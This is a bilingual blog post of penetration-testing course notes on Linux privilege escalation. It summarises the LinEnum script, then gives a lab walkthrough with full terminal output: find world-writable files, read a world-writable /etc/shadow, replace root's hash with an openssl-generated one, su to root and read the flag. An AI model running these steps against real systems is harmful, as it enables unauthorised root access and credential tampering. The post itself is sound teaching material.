---
layout: post
title: "Linux Privilege Escalation - Weak Permissions"
date: "2023-06-29"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Privilege Escalation
## Linux Privilege Escalation - Weak Permissions
### LinEnum
LinEnum - LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.

GitHub Repo: [rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

LinEnum是一个简单的bash脚本，它自动化了常见的Linux本地枚举检查，并识别特权升级漏洞。

GitHub存储库：[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

获取更多信息请访问www.rebootuser.com

注意：导出功能目前处于实验阶段。

常规用法：

版本 0.982

* 示例：./LinEnum.sh -s -k 关键词 -r 报告名 -e /tmp/ -t

选项：
* -k 输入关键词
* -e 输入导出位置
* -t 包括详细（耗时）测试
* -s 提供当前用户密码以检查sudo权限（不安全）
* -r 输入报告名
* -h 显示帮助文本

没有选项运行 = 有限扫描/无输出文件

* -e 要求用户输入输出位置，例如 /tmp/export。如果该位置不存在，将被创建。
* -r 要求用户输入报告名。报告（.txt 文件）将保存在当前工作目录中。
* -t 执行详细（慢速）测试。如果没有此开关，默认进行“快速”扫描。
* -s 使用当前用户和提供的密码检查sudo权限 - 请注意，这是不安全的，仅用于CTF比赛！
* -k 可选开关，用户可以在多个文件中搜索单个关键词（详见下文）。

请参阅CHANGELOG.md获取更多详细信息

LinEnum执行的检查/任务的高级摘要：

* 内核和发行版本详细信息
* 系统信息：
  * 主机名
  * 网络详细信息：
  * 当前IP
  * 默认路由详细信息
  * DNS服务器信息
* 用户信息：
  * 当前用户详细信息
  * 最后登录的用户
  * 显示登录到主机的用户
  * 列出所有用户，包括uid/gid信息
  * 列出root账户
  * 提取密码策略和哈希存储方法信息
  * 检查umask值
  * 检查密码哈希是否存储在/etc/passwd中
  * 提取“默认”uid（如0、1000、1001等）的完整详细信息
  * 尝试读取受限文件，如/etc/shadow
  * 列出当前用户的历史文件（例如.bash_history、.nano_history等）
  * 基本SSH检查
* 特权访问：
  * 最近使用sudo的用户
  * 确定/etc/sudoers是否可访问
  * 确定当前用户是否具有无密码的Sudo访问权限
  * 已知的“好”的特权执行文件是否可通过Sudo使用（例如nmap、vim等）
  * root的主目录是否可访问
  * 列出/home/的权限
* 环境：
  * 显示当前$PATH
  * 显示环境信息
* 作业/任务：
  * 列出所有cron作业
  * 查找所有可由其他系统用户拥有的可写的cron作业
  * 列出活

动和非活动的systemd定时器
* 服务：
  * 列出网络连接（TCP和UDP）
  * 列出运行中的进程
  * 查找和列出进程二进制文件及其权限
  * 列出inetd.conf/xinetd.conf内容和相关二进制文件权限
  * 列出init.d二进制文件权限
* 版本信息（以下内容）：
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * 检查用户配置
    * 显示已启用的模块
    * 检查htpasswd文件
    * 查看www目录
* 默认/弱凭据：
  * 检查默认/弱的Postgres账户
  * 检查默认/弱的MYSQL账户
* 搜索：
  * 查找所有SUID/GUID文件
  * 查找所有可写的SUID/GUID文件
  * 查找所有由root拥有的SUID/GUID文件
  * 查找“有趣”的SUID/GUID文件（例如nmap、vim等）
  * 查找具有POSIX权限的文件
  * 列出所有可写的文件
  * 查找/列出所有可访问的*.plan文件并显示内容
  * 查找/列出所有可访问的*.rhosts文件并显示内容
  * 显示NFS服务器详细信息
  * 查找包含脚本运行时提供的关键词的*.conf和*.log文件
  * 列出位于/etc中的所有*.conf文件
  * 查找.bak文件
  * 定位邮件
* 平台/软件特定测试：
  * 检查是否在Docker容器中
  * 检查主机是否安装了Docker
  * 检查是否在LXC容器中

## Demo: Linux Privilege Escalation - Weak Permissions（演示：Linux特权升级 - 弱权限。）
We'll be exploring how to identify specific Privilege Escalation vulnerabilities on Linux manually and how they can be exploited in order to elevate your privileges.

We're going to be focusing on weak permissions, and how to exploit files or binaries that have weak permissions. On a Linux system, you have the ability to assign permissions to a file. And the permissions are typically going to be read, write, or execute. And based on the various other user accounts on the system, for example, I only want the root user to be able to modify the file or execute it. And in this particular scenario, we are going to be trying to identify files that are typically secured or files cannot be edited by standard user accounts or user accounts that are not privileged. And we'll see whether we can identify any of those files that have been misconfigured. And whose permissions have been modified either by mistake or it's something that the system administrator forgot. And we'll be exploring how we can take advantage of this.

We are going to be focusing on the manual technique of identifying the vulnerability. And then how it can be exploited. And the objective of these sections of the privilege escalation sections is to introduce you to privilege escalation as a process.

You'll be provided with a terminal session on the target system, after exploiting the target system. So that you don't need to gain access and then perform the privilege escalation technique. So you'll be provided with access to a non privileged user account on the Linux target system. And you can then move on to privilege escalation.

You'll be provided with a very simple terminal sesssion on the target system. So you don't need to go through the exploitation phase.

You have gained access to a Linux target system as the user student. So you have access via a user account called student.

The first step, is to perform your typical local enumeration in regards to enumerating user and group information.

```
whoami
```

We can identify what other users are on the system by:

```
cat /etc/passwd
```

The only other user account is the root account. We want to gain access to the root account.

We can also list out the groups by:

```
groups
```

```
cat /etc/group
```

These are all the groups available. And most of these are just for the service accounts.

```
groups student
```

To check and see what groups the user account student is a part of. That user is not a privileged user at all.

In this particular scenario, we are going to be trying to identify files with weak or misconfigured permissions.

And the way we can do this is by utilizing the find utility.

`/`: we're performing the search directly from the root of the file system. So we are searching all directories.

`-perm`: we can then specify the permissions that we're looking for.

the permission that we're interested in is where every user on the system has the ability to write or make changes to the file, not really executed, because we're not looking for binaries or executables. `-o`: everyone. and this is part of the Linux permissions, and how you can set permissions to a file or binary. `-o+w`: we want to find files that can be edited by everyone. And we specify the edit function or the right permission with the `w` there. 

这条命令会在Linux系统中搜索所有的文件和目录，并列出所有权限为“其他用户可写入”的文件和目录。具体来说，命令的各个部分的含义如下：

- `find`: 一个用于在文件系统中搜索文件和目录的命令。
- `/`: 搜索的起点为根目录。
- `-not -type l`: 排除符号链接文件，只搜索实际的文件和目录。
- `-perm -o+w`: 搜索权限设置为“其他用户可写入”的文件和目录。

因此，这条命令的作用是找出系统中所有权限设置不当的文件和目录，可能会导致系统安全性问题。

```
find / -not -type l -perm -o+w
```

It's going to list out all the files that can be modified by every user account on the system, in regardless of their permissions. The objective here is to find a file that could potentially be helpful or useful to us in elevating our privilegs.

The /etc/shadow file can be modified by any user account on the system. This is really bad from a security perspective, because the user account information is stored in the /etc/passwd file. And the user account passwords are stored in the `/etc/shadow` file. The `/etc/shadow` file on Linux by default can only be viewed by the root user. And in order for you to view it or make changes to it, you need to have the highest privileges available.

And in this case, it looks like the administrator had allowed any user on the system to make changes to `/etc/shadow`. That means that as the student user, we can say:

```
cat /etc/shadow
```

This will list out all the user accounts that we had. the `/etc/shadow` file stores the hashed passwords for the user accounts.

The student account doesn't have a password, and we don't have the root account password.

How can we use this to elevate our privileges? If we have access to the file where the user account passwords are specified or where they're located, then we could potentially change or substitue the root user account password with our own.

There's one important caveat here, and this all ties into permissions, is that the shadow file stores the passwords in an encrypted format. But what that means is that if we had to replace the root user account password, that means we need to replace it with a hashed password.

Before we do that, we can confirm that we indeed can modify the `/etc/shadow` file by listing out the file itself in order to list out the permissions.

```
ls -al /etc/shadow
```

```
-rw-rw-rw- 1 root shadow 523 Sep 23 2018 /etc/shadow
```

The owner of the file is the root user and the group is shadow. The root user has the ability to read and write. Other user accounts on the system also have the ability to read and write or make changes to this file, which is a huge security misconfiguration.

How do we generate a password that we can replace? In order to do that, we can use the `openssl` utility. And we are going to say that the format of the password is going to be passwd, so that openssl knows that we're generating a Linux password in an encrypted format. We're going to use the algorithm one, which is the weakest Linux hashing algorithm. And then specify the password in clear text that we would like. So if I wanted to change the root user accounts password to password. 

这条命令使用OpenSSL工具生成一个基于MD5哈希算法的密码散列值。具体来说，命令的各个部分的含义如下：

- `openssl passwd`: 使用OpenSSL工具生成密码散列值。
- `-1`: 指定使用MD5哈希算法。
- `-salt abc`: 指定使用“abc”字符串作为盐值，增加密码散列值的强度。
- `password`: 指定要生成密码散列值的原始密码。

因此，这条命令的作用是生成一个基于MD5哈希算法的密码散列值，并使用“abc”字符串作为盐值，以增加密码散列值的强度。

```
openssl passwd -1 -salt abc password
```

It's now going to give you your hashed password here, which we can now replace or enter into the `/etc/shadow` file.

```
vim /etc/shadow
```

We want to get rid of that asterisk, and paste in what we copied.

And we have elevated our privileges. In order to do that, we can use the super user command to switch to the super user account, which is the root user. 

```
su
```

we'll just type in password, the value we set. We have now obtained root access on the target system.

I can also confirm that by:

```
id
whoami
```

And we've now gained access to the target system.

This is a vulnerability that you might run across in certain scenarios. But in most cases, it's not going to be the `/etc/shadow` file. It will be other files that could potentially be used to elevate your privileges. The objective here was to show you how important permissions are especially in the context of Linux, and how if you misconfigure a important file and you misconfigure the files' permissions, other users on the system can take advantage of that misconfiguration to perform a plethora of other activity that's not really related to privilege escalation, but they can do a lot of damage. In our case, we've taken a look at how to use this vulnerability or to leverage this vulnerability to elevate our privileges. 

# Permissions Matter!
## Overview
The admin was tasked to create a replica of an existing Linux system. He copied the entire filesystem to his computer, made modifications to some files and then copied it onto the newly provisioned system. Unfortunately, in his haste to set the new system up, he forgot to take care of permission sets. 

Your mission is to get a root shell on the box and retrieve the flag!

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-75.pdf

# 权限很重要！ 
## 概述 
管理员的任务是创建现有 Linux 系统的副本。他将整个文件系统复制到他的计算机上，对一些文件进行了修改，然后将其复制到新配置的系统上。不幸的是，在他匆忙设置新系统时，他忘记了处理权限集。

你的任务是在盒子上得到一个root shell并取回旗帜！

## 解决方案
本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-75.pdf

## 复现视频内容
```
student@attackdefense:~$ whoami
student
```

```
student@attackdefense:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
student:x:999:999:student:/home/app:/bin/sh
```

```
student@attackdefense:~$ groups
student
```

```
student@attackdefense:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
student:x:999:
```

```
student@attackdefense:~$ groups student
student : student
```

```
student@attackdefense:~$ find / -not -type l -perm -o+w
/etc/shadow
```

```
student@attackdefense:~$ cat /etc/shadow
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

```
student@attackdefense:~$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow
```

```
student@attackdefense:~$ openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/
```

```
student@attackdefense:~$ vim /etc/shadow
student@attackdefense:~$ cat /etc/shadow
root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

```
student@attackdefense:~$ su
Password:
root@attackdefense:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:/home/student# whoami
root
```

```
root@attackdefense:/home/student# find / -name "*flag*"
/root/flag
root@attackdefense:/home/student# cat /root/flag
e62ab67ddff744d60cbb6232feaefc4d
```